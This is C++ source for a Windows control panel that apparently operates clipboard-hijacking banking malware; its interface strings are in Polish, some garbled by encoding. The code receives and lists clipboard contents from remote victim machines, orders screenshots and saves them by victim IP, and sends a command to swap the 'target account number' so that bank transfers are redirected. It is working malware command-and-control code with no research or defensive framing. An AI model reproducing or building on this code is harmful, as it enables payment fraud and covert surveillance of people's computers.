#include "ClientHandlerWindow.hh"
#ifndef UNICODE
#define UNICODE
#endif//UNICODE
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include "Tools.hh"
#include "IpAddress.hh"
#include "ServerConfig.hh"
#include <future>
#include <chrono>
#include <fstream>
#include <ctime>
#include <filesystem>
#include <winuser.h>
#include <shellapi.h>

#define CHANGE_ACCOUNT_NO_BTN 1
#define GET_SCREENSHOT_BTN 2
using namespace std::chrono_literals;

ClientHandlerWindow::ClientHandlerWindow(SOCKET clientSocket)
	: clientSocket(clientSocket), socket(clientSocket)
{
	sockaddr sa{};
	int nLen = sizeof(sa);
	getpeername(this->clientSocket, &sa, &nLen);
	this->ipAddress = IpAddress{ sa };


}

ClientHandlerWindow::~ClientHandlerWindow()
{

}


void ClientHandlerWindow::RecvClipboardString(const Metadata& metadata) {
	auto clipboardString = this->socket.RecvString(metadata);
	Tools::PrintDebugMessage("Received clipboard message (from " + (std::string)this->ipAddress + "):\n" + clipboardString);
	//std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
	//auto wstr = converter.from_bytes(clipboardString);
	this->clipboardContentHistory.push_back(clipboardString);
	SendMessageA(this->clipboardListBox, LB_ADDSTRING, 0, (LPARAM)this->clipboardContentHistory.back().c_str());

}

std::vector<char> ClientHandlerWindow::RecvScreenshotAsJpgBytes(const Metadata& metadata) {
	Tools::PrintDebugMessage("Receiving screenshot: " + std::to_string(metadata.size));
	auto screenshot = this->socket.RecvBytes(metadata.size);
	Tools::PrintDebugMessage("Receiving screenshot done!: " + std::to_string(screenshot.size()));
	return screenshot;
}

void ClientHandlerWindow::SaveScreenshot(const std::vector<char>& screenshot) {
	auto time = std::time(nullptr);
	char buffer[80];
	time_t rawTime;
	tm timeinfo;
	std::time(&rawTime);
	localtime_s(&timeinfo, &rawTime);
	strftime(buffer, sizeof(buffer), "%d_%m_%Y_%I_%M_%S", &timeinfo);
	std::string dateTime(buffer);
	std::experimental::filesystem::path path = (std::string)this->ipAddress + "_" + dateTime + ".jpg";
	{
		auto file = std::ofstream(path, std::ios::binary);
		std::copy(screenshot.begin(), screenshot.end(), std::ostreambuf_iterator<char>(file));
	}
	::MessageBox(this->hwnd, (L"Zapisano zrzut ekranu: "s + path.wstring()).c_str(), L"Sukces", MB_OK);
	/*ShellExecute(NULL, "open", "http://dreamincode.net",
		NULL, NULL, SW_SHOWNORMAL);*/

}


void ClientHandlerWindow::Handle() {
	while (true) {
		auto metadata = this->socket.RecvMetadata();
		switch (metadata.dataType) {
		case DataType::STRING:
			this->socket.RecvString(metadata);
			break;
		case DataType::INT32:
			//this->RecvInt32(metadata);
			break;
		case DataType::CLIPBOARD_STRING:
			this->RecvClipboardString(metadata);
			break;
		case DataType::ACCOUNT_SWAP_NOTIFICATION:
			MessageBox(this->hwnd, (L"Pomyœlnie podmieniono nr konta na urz¹dzeniu: !"s + (std::wstring)this->ipAddress).c_str(), L"Sukces", MB_OK);
			Tools::PrintDebugMessage("Account swapped!");
			break;
		case DataType::SCREENSHOT:
		{
			auto screenshot = this->RecvScreenshotAsJpgBytes(metadata);
			this->SaveScreenshot(screenshot);
		}
		break;
		default:;
		}
	}
}

void ClientHandlerWindow::ChangeAccountNumber(std::string accountNumber) {
	auto size = ::strlen(accountNumber.c_str());
	this->socket.SendMetadata(Metadata{ DataType::CHANGE_ACCOUNT_NUMBER_CMD, size });
	this->socket.SendBytes(accountNumber.c_str(), size);
}

void ClientHandlerWindow::SendScreenshotCmd() {
	Tools::PrintDebugMessage("Sending MAKE_SCREENSHOT command");
	this->socket.SendMetadata(Metadata{ DataType::MAKE_SCREENSHOT_CMD, NULL });
}

void ClientHandlerWindow::Close() {
	PostMessage(this->hwnd, WM_CLOSE, 0, 0);
}

LRESULT ClientHandlerWindow::HandleMessage(UINT uMsg, WPARAM wParam, LPARAM lParam) {
	switch (uMsg) {
	case WM_DESTROY:
		::PostQuitMessage(0);
		return 0;
	case WM_CREATE:
		this->accountNoTextField = ::CreateWindowEx(WS_EX_CLIENTEDGE, L"EDIT", NULL, WS_CHILD | WS_VISIBLE | WS_BORDER,
			10, 10, 250, 30, this->hwnd, NULL, this->hInstance, NULL);
		this->changeAccountButton = ::CreateWindow(
			L"BUTTON",
			L"Zmieñ docelowy nr konta",
			WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
			10, 50, 250, 50, this->hwnd, (HMENU)CHANGE_ACCOUNT_NO_BTN, this->hInstance,
			NULL
		);

		this->changeAccountButton = ::CreateWindow(
			L"BUTTON",
			L"Zrób zrzut ekranu",
			WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
			10, 110, 250, 50, this->hwnd, (HMENU)GET_SCREENSHOT_BTN, this->hInstance,
			NULL
		);
		this->clipboardListBox = CreateWindowEx(WS_EX_CLIENTEDGE, L"LISTBOX", NULL, WS_CHILD | WS_VISIBLE | WS_BORDER | WS_VSCROLL| ES_AUTOVSCROLL,
			270, 10, 1000, 700, hwnd, NULL, hInstance, NULL);

		return 0;

	case WM_COMMAND:
		switch (LOWORD(wParam)) {
		case CHANGE_ACCOUNT_NO_BTN:
		{
			int len = GetWindowTextLength(this->accountNoTextField)+1;
			if(len==1) {
				MessageBox(this->hwnd, L"Nie podano nr konta", L"B³¹d", MB_ICONERROR | MB_OK);
				return 0;
			}
			char *txt = new char[len];
			GetWindowTextA(this->accountNoTextField, txt, len);
			this->ChangeAccountNumber(std::string{txt});
			MessageBox(this->hwnd, L"Wys³ano ¿¹danie zmiany docelowego nr konta", L"INFO",  MB_OK);
			delete[] txt;
		}
		return 0;
		case GET_SCREENSHOT_BTN:
			this->SendScreenshotCmd();
			return 0;
		default:;
		}
		return 0;
	case WM_PAINT:
	{
		
		PAINTSTRUCT ps;
		auto hdc = ::BeginPaint(hwnd, &ps);
		::FillRect(hdc, &ps.rcPaint, (HBRUSH)(COLOR_WINDOW + 1));
		::EndPaint(this->hwnd, &ps);
		/*if (this->lastScreenshot.empty()) { return 0; }
		ULONG_PTR gdiplusToken;
		Gdiplus::GdiplusStartupInput gdiplusStartupInput;
		GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
		auto lastScreenshot = this->GetLastScreenshot();
		IStream *pImgStream = ::SHCreateMemStream((BYTE*)lastScreenshot.data(), lastScreenshot.size());

		auto img = Gdiplus::Image();

		
		
		
		
		Gdiplus::GdiplusShutdown(gdiplusToken);*/

	}

	return 0;
	default:
		return DefWindowProc(hwnd, uMsg, wParam, lParam);
	}
}

std::vector<char> ClientHandlerWindow::GetLastScreenshot() const {
	std::lock_guard<std::mutex> lock(this->lastScreenshotMutex);
	return lastScreenshot;
}

void ClientHandlerWindow::SetLastScreenshot(const std::vector<char>& lastScreenshot) {
	std::lock_guard<std::mutex> lock(this->lastScreenshotMutex);
	this->lastScreenshot = lastScreenshot;
}
